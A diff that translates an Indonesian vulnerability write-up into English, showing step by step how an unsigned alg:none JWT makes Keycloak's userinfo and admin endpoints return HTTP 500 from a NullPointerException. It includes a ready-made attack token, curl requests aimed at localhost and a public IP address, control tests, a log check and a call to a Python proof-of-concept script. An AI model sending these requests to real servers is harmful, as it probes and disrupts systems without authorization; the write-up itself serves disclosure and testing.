@@ -1,12 +1,12 @@
 # Tutorial: Finding #2 — alg:none JWT → HTTP 500 (NullPointerException)
 
 **Severity:** MEDIUM (CVSS 5.3)
-**Waktu demo:** ~3 menit
-**Kebutuhan:** Terminal saja (tidak perlu login)
+**Demo time:** ~3 minutes
+**Requirements:** Terminal only (no login needed)
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan
+## Step 0: Ensure Keycloak is Running
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
@@ -14,18 +14,18 @@ curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('
 
 ---
 
-## Langkah 1: Buat JWT dengan alg:none
+## Step 1: Create a JWT with alg:none
 
-Token ini dibuat tanpa perlu kredensial apapun — ini serangan unauthenticated.
+This token is created without any credentials — this is an unauthenticated attack.
 
 ```bash
 # Header: {"alg":"none","typ":"JWT"}
 # Payload: {"sub":"attacker","exp":9999999999}
-# Signature: (kosong)
+# Signature: (empty)
 ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."
 ```
 
-Verifikasi isi JWT:
+Verify the JWT contents:
 ```bash
 echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" | base64 -d 2>/dev/null
 ```
@@ -36,11 +36,11 @@ echo "eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0=" | base64 -d 2>/dev/null
 ```
 Output: `{"sub":"attacker","exp":9999999999}`
 
-> **Poin:** Token ini punya `alg: none` — artinya tidak ada signature. Server seharusnya langsung tolak dengan 401.
+> **Key point:** This token has `alg: none` — meaning there is no signature. The server should immediately reject it with 401.
 
 ---
 
-## Langkah 2: Kirim ke /userinfo Endpoint
+## Step 2: Send to /userinfo Endpoint
 
 ```bash
 ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."
@@ -49,23 +49,23 @@ curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo
   -H "Authorization: Bearer $ALG_NONE"
 ```
 
-**Yang diharapkan (aman):**
+**Expected (secure):**
 ```
 HTTP/1.1 401 Unauthorized
 {"error":"invalid_token"}
 ```
 
-**Yang terjadi (VULNERABLE):**
+**Actual result (VULNERABLE):**
 ```
 HTTP/1.1 500 Internal Server Error
 {"error":"unknown_error","error_description":"For more on this error consult the server log."}
 ```
 
-> **HTTP 500 bukan 401!** Server crash dengan NullPointerException.
+> **HTTP 500 instead of 401!** The server crashes with a NullPointerException.
 
 ---
 
-## Langkah 3: Kirim ke Admin API /users
+## Step 3: Send to Admin API /users
 
 ```bash
 curl -si http://46.101.162.187:8080/admin/realms/test/users \
@@ -80,7 +80,7 @@ HTTP/1.1 500 Internal Server Error
 
 ---
 
-## Langkah 4: Kirim ke Admin API /clients
+## Step 4: Send to Admin API /clients
 
 ```bash
 curl -si http://46.101.162.187:8080/admin/realms/test/clients \
@@ -94,47 +94,47 @@ HTTP/1.1 500 Internal Server Error
 
 ---
 
-## Langkah 5: Control Test — Random String (Harus 401)
+## Step 5: Control Test — Random String (Should return 401)
 
-Untuk membuktikan bahwa 500 itu spesifik pada `alg:none`, bukan error umum:
+To prove that the 500 is specific to `alg:none`, not a general error:
 
 ```bash
 curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
   -H "Authorization: Bearer ini-bukan-jwt-yang-valid"
 ```
 
-**Output (Benar):**
+**Output (Correct):**
 ```
 HTTP/1.1 401 Unauthorized
 ```
 
-> Random string → 401 (benar). Tapi alg:none → 500 (bug).
+> Random string → 401 (correct). But alg:none → 500 (bug).
 
 ---
 
-## Langkah 6: Control Test — JWT dengan Signature Salah (Harus 401)
+## Step 6: Control Test — JWT with Wrong Signature (Should return 401)
 
 ```bash
 curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
   -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.signature-salah"
 ```
 
-**Output (Benar):**
+**Output (Correct):**
 ```
 HTTP/1.1 401 Unauthorized
 ```
 
-> JWT dengan alg:RS256 tapi signature salah → 401 (benar). Hanya alg:none yang menyebabkan 500.
+> JWT with alg:RS256 but wrong signature → 401 (correct). Only alg:none causes the 500.
 
 ---
 
-## Langkah 7: Cek Server Log (Opsional)
+## Step 7: Check Server Log (Optional)
 
 ```bash
 tail -20 /home/anggi/keycloak-research/keycloak.log | grep -A5 "NullPointerException"
 ```
 
-**Output yang diharapkan:**
+**Expected output:**
 ```
 ERROR [org.keycloak.services.error.KeycloakErrorHandler]
 Uncaught server error: java.lang.NullPointerException:
@@ -145,7 +145,7 @@ because the return value of
 
 ---
 
-## Langkah 8: Jalankan Python PoC (Otomatis Semua)
+## Step 8: Run Python PoC (Automated Full Test)
 
 ```bash
 python3 pocs/poc_f2_alg_none_npe.py --host http://localhost:8080
@@ -153,7 +153,7 @@ python3 pocs/poc_f2_alg_none_npe.py --host http://localhost:8080
 
 ---
 
-## Ringkasan
+## Summary
 
 | Endpoint | Token | Expected | Actual | Status |
 |---|---|---|---|---|
@@ -163,4 +163,4 @@ python3 pocs/poc_f2_alg_none_npe.py --host http://localhost:8080
 | /userinfo | random string | 401 | 401 | Correct |
 | /userinfo | wrong signature | 401 | 401 | Correct |
 
-**Kesimpulan:** Semua Bearer-authenticated endpoint crash dengan NullPointerException ketika menerima JWT dengan `alg:none`. Tidak perlu kredensial apapun untuk trigger.
+**Conclusion:** All Bearer-authenticated endpoints crash with a NullPointerException when receiving a JWT with `alg:none`. No credentials are needed to trigger this.
